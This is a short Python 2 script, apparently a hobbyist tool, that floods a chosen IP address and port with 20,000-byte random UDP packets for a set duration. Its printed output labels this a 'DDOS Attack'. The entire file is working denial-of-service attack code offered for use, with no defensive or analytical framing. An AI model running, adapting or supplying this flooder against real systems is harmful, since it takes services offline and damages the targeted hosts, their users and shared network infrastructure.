import time
import socket
import random
import sys
def usage():
    print "\033[1;32mPlease Input Valid Informations!"
def flood(victim, vport, duration):
    # Support ~Ariq!
    # Creating Server "SOCK_DGRAM" UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 Bytes To Server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91m\033[97;1m\033[34m          >\033[97;1m Starting \033[1;32m%s \033[1;91mSending DDOS Attack \033[1;32m%s \033[1;91mWith Port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

